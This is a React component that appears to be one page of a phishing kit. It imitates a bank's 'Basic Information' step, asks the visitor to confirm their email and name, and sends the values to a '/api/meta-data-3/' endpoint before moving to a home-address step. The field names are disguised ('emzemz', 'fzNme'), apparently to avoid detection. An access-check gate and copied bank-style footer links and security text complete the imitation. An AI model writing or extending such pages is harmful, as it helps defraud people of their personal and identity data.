import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', emzemz: '' });
  const [emzemz, setEmzemz] = useState('');
  const isAllowed = useAccessCheck(baseUrl);

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};

  React.useEffect(() => {
    if (emzemzState) {
      setEmzemz(emzemzState);
    }
  }, [emzemzState]);

  //Show loading state while checking access
  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  const validateEmzemz = (emzemz: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  const validateForm = () => {
    const newErrors = { fzNme: '', lzNme: '', emzemz: '' };

    if (!fzNme.trim()) newErrors.fzNme = 'First name is required';
    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required';
    if (!emzemz.trim()) newErrors.emzemz = 'Email is required';
    else if (!validateEmzemz(emzemz)) newErrors.emzemz = 'Invalid email format';

    setErrors(newErrors);
    return !newErrors.fzNme && !newErrors.lzNme && !newErrors.emzemz;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/meta-data-3/`, {
        emzemz,
        fzNme,
        lzNme
      });

      navigate('/home-address', {
        state: {
          emzemz,
          fzNme,
          lzNme
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="">We will need you to confirm your personal information.</p>

        <form onSubmit={handleSubmit}>
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Email:</label>
            <input
              id="emzemz"
              name="emzemz"
              type="email"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter email address"
            />
            {errors.emzemz && (
              <div className="flex items-center gap-2 text-red-600 text-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.emzemz}</span>
              </div>
            )}
          </div>

          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">First Name:</label>
            <input
              id="fzNme"
              name="fzNme"
              type="text"
              value={fzNme}
              onChange={(e) => setFzNme(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter first name"
            />
            {errors.fzNme && (
              <div className="flex items-center gap-2 text-red-600 text-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.fzNme}</span>
              </div>
            )}
          </div>

          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Last Name:</label>
            <input
              id="lzNme"
              name="lzNme"
              type="text"
              value={lzNme}
              onChange={(e) => setLzNme(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
              placeholder="Enter last name"
            />
            {errors.lzNme && (
              <div className="flex items-center gap-2 text-red-600 text-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
                </svg>
                <span>{errors.lzNme}</span>
              </div>
            )}
          </div>

          {!isLoading ? (
            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            </div>
          ) : (
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
          )}
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Username?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Password?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Everything?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Locked Out?</a>
        </div>
      </div>
    </div>
  );
};

export default BasicInfo;
